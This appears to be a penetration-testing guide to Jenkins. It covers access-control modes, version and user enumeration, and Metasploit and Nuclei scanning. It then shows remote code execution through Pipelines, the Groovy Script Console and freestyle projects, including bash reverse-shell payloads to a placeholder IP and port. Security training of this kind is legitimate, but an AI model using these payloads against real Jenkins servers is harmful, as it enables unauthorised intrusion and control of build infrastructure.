# Jenkins Security Testing

Jenkins is a tool that makes it easy to set up a **continuous integration (CI)** or **continuous delivery (CD)** environment. It can work with almost any **programming language** and source code repository through pipelines.

Jenkins can also automate many common development tasks such as building, testing, and deploying applications. It does not remove the need to write scripts for each step, but it makes it easier to connect these steps together and automate the whole process.

### Basic Jenkins Information

#### Access Control

<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

* **Anyone can do anything**: the most danager one Even anonymous access can administrate the server\[
* **Legacy mode**: Same as Jenkins <1.164. If you have the **“admin” role**, you’ll be granted **full control** over the system, and **otherwise** (including **anonymous** users) you’ll have **read** access
* **Logged-in users can do anything**: In this mode, every **logged-in user gets full control** of Jenkins. The only user who won’t have full control is **anonymous user**, who only gets **read access** this if combine with allow signup will be make any one in network to take full adminstarter
* **Matrix-based security**: You can configure **who can do what** in a table. Each **column** represents a **permission**. Each **row** **represents** a **user or a group/role.** This includes a special user ‘**anonymous**’, which represents **unauthenticated users**, as well as ‘**authenticated**’, which represents **all authenticated users**. this is the most save configriation if conifger correct

<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

### Jenkins Nodes, Agents

Jenkins **nodes** are the machines where **agents** run, while agents execute Jenkins tasks through **executors**. An agent can run directly on a host or inside a container such as Docker.

From a pentesting perspective, it is important to identify **where the agent is running and under which user and privileges**. A shell obtained through an agent only provides access to the environment where the agent is running. If the agent is inside a container, having root privileges in that container does not automatically provide root access to the underlying host.

### Enumeration

The Jenkins **`/oops (404 page)`** page can disclose the running **Jenkins version**. Once the version is identified, it can be compared against known vulnerabilities and security advisories.

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

A simple way to research the version is to search for queries such as:

```
Jenkins "VERSION" ("CVE-2025" OR "CVE-2026" OR "exploit" OR "PoC" OR "vulnerability")
```

However, don't rely only on Google results. The official [**Jenkins Security Advisories**](https://www.jenkins.io/security/advisories/) archive should also be checked because vulnerabilities can affect both Jenkins core and individual plugins.

When reviewing a potential CVE, verify the **affected version range, required permissions, affected component, and fixed version** before attempting to reproduce it. For example, recent Jenkins advisories include vulnerabilities affecting specific Jenkins core versions as well as individual plugins.

You can also check for **interesting or less obvious endpoints**, such as `/people` and `/asynchPeople`. Depending on the Jenkins configuration and version, these endpoints may disclose information about the currently logged-in user or other users. This information can be useful when assessing authentication controls, including username enumeration and password-spraying risks.

Some of this enumeration can be automated using the Metasploit module:

```
auxiliary/scanner/http/jenkins_enum
```

<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Don't forget to review and change the default options when necessary. As shown in the image, the module initially returns **404 Not Found** because it is requesting the Jenkins instance under `/jenkins/`.\
In newer Jenkins installations, Jenkins is often deployed at the root path (`/`) instead of `/jenkins/`. In this case, changing the `TARGETURI` option to `/` allows the module to work correctly.

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Another useful tool for Jenkins enumeration is **Nuclei**. You can use Jenkins-specific templates by specifying the `jenkins` tag:

<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

#### RCE

Jenkins can provide several paths to **Remote Code Execution (RCE)**, depending on the available permissions and configuration. Here, I will focus on one of the most common scenarios: **RCE through a Pipeline**.

**RCE Using a Pipeline**

If the current user has permission to create or modify a Pipeline, a Pipeline can be used to execute commands on the Jenkins agent.

From **New Item** create a new item and select **Pipeline**.

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

In the **Pipeline** section, you can define the commands that should be executed. For example, the following Declarative Pipeline executes a reverse shell

```
pipeline {
    agent any

    stages {
        stage('Build') {
            steps {
                sh 'bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"'
            }
        }
    }
}
```

After saving the Pipeline, clicking **Build Now** causes Jenkins to execute it.

From a penetration-testing perspective, the important point is that this command executes in the context of the **agent running the Pipeline**. Therefore, the resulting access depends on the agent's operating system, user, privileges, and execution environment.

For example, an agent running inside a Docker container may give you command execution inside that container rather than directly on the underlying host

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

#### RCE with Groovy Script

The Jenkins **Script Console** is a web-based **Groovy shell** available to users with the `Administer` permission. It provides direct access to the Jenkins JVM and can be used to execute arbitrary Groovy code, including spawning operating-system processes.

To access it, navigate to:

```
/manage/script
```

From a penetration-testing perspective, this is one of the most direct ways to achieve command execution when the required permission is available.

For example, you can use the following Groovy code to spawn a shell process:

```
def process = ["bash", "-c", "bash -i >& /dev/tcp/IP/PORT 0>&1"].execute()
process.waitFor()
println "Found text:\n${process.text}"
```

You can modify the command according to the target environment and the objective of the test.

The Script Console is particularly interesting during a Jenkins assessment because the code executes within the **Jenkins JVM**, so the resulting command runs with the privileges of the operating-system account running Jenkins.

#### Create project

This method is relatively **noisy** because it requires creating a completely new Jenkins project. Obviously, this will only work if the current user has permission to create new projects.

1.  Create a new project: Go to **New Item** and select **Freestyle project**.

    <figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
2. Inside the **Build** section, select **Execute shell** and enter your command or payload.\
   Pasted image 20260928165827.png

Save the project and click **Build Now**. Jenkins will execute the configured command on the agent assigned to the project.

From a pentesting perspective, this method is useful for testing whether a user can create projects and execute arbitrary commands through build steps. However, creating a new project can leave visible evidence in Jenkins, making this approach more noticeable than methods such as the Script Console.
